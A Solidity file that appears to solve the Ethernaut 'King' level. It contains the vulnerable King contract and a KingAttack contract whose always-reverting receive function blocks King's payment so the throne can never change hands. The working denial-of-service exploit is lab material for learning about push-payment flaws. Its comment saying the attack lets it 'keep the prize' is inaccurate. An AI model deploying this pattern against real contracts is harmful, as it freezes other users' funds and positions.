// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0xd404B924F07a985Ee723fab7FaCeBE56CF69113B
contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

// Attack king by claiming ownership with malicious contract.
// In this contract, we will use the fallback function to
// revert the transaction and keep the prize.
contract KingAttack {
    King public king;
    address public owner;

    constructor(King king_) payable {
        king = king_;
        owner = msg.sender;

        // Attack
        // Use call to avoid OOG error.
        (bool success, ) = address(king).call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        revert();
    }
}
